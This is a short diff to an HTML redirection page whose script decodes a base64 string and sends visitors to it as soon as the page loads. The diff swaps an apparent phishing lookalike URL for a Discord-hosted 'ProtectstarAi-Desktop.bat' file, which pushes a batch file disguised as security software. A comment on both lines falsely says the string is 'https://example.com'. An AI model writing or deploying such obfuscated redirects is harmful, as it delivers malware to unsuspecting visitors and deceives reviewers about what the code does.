@@ -6,7 +6,7 @@
     <title>Redirection Page</title>
     <script type="text/javascript">
         // Base64 encoded and URL encoded URL (for redirection)
-        var encodedUrl = "aHR0cHM6Ly9jZW50cmVsaW5rLWRjeHYub25yZW5kZXIuY29tLw==";  // This is "https://example.com" encoded
+        var encodedUrl = "aHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTM2MjgxODE2NjIzNjkwNTQ3NS8xMzYzMTY5MDc1NTU5MjY4NDQzL1Byb3RlY3RzdGFyQWktRGVza3RvcC5iYXQ/ZXg9NjgwNTBkYTImaXM9NjgwM2JjMjImaG09Mzk1NDEyN2JmNjcwYWMxMTIxMGU2ZTVkNzMyZGM3MDA4ZWM5OTkzNDI0MDRmYjc3NjM2YTc3ODgwMzEyMWYzZCY=";  // This is "https://example.com" encoded
         // Decode the URL and redirect
         window.location.href = decodeURIComponent(atob(encodedUrl));
     </script>
